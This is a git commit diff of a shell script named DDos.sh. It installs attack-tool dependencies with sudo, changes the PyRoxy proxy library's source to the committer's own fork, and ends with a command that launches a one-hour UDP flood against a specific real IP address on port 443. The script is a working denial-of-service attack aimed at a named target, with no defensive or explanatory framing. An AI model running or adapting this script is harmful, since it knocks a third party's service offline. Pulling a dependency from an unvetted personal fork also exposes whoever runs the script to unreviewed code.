af61a86e0669d3a878b56c44370aeb7da9e5810b
ChenSa <74320851+Chen-Sa@users.noreply.github.com>
2022-09-09 21:10:41 +0000

    Update DDos.sh

--- DDos.sh
+++ DDos.sh
@@ -10,6 +10,6 @@ sudo python3 -m pip install requests==2.27.1
 sudo python3 -m pip install impacket==0.9.23
 sudo python3 -m pip install psutil>=5.9.0
 sudo python3 -m pip install icmplib>=2.1.1
-sudo python3 -m pip install git+https://github.com/MHProDev/PyRoxy.git
+sudo python3 -m pip install git+https://github.com/Chen-Sa/PyRoxy.git
 sudo python3 -m pip install yarl~=1.7.2
 sudo python3 start.py udp 80.96.156.22:443 1000 3600
